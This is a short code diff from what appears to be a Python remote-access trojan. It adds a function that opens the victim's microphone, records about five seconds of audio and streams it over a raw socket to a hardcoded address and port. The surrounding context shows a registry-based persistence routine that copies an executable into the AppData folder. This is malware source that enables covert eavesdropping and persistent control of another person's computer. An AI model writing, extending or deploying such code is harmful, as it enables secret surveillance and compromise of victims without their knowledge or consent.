@@ -18,6 +18,33 @@ import shutil
 
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+FORMAT = pyaudio.paInt16
+CHANNEL = 1
+RATE = 44100
+CHUNK = 1024
+
+def record_n_send():
+    audio = pyaudio.PyAudio()
+    stream = audio.open(format=FORMAT, channels=CHANNEL,
+                        rate=RATE, input=True,
+                        frames_per_buffer=CHUNK)
+    print('Recording')
+    frame = []
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect(('192.168.18.210', 9996))
+            for _ in range(0, int(RATE / CHUNK * 5)):
+                data = stream.read(CHUNK)
+                s.sendall(data)
+            print('Record done')
+    except socket.error as e:
+        print(f'{e}')
+    finally:
+        print('done')
+        stream.stop_stream()
+        stream.close()
+        audio.terminate()
+        
 def  execute_persistence(nama_registry, file_exe):
     file_path = os.environ['appdata']+'\\'+file_exe
     try:
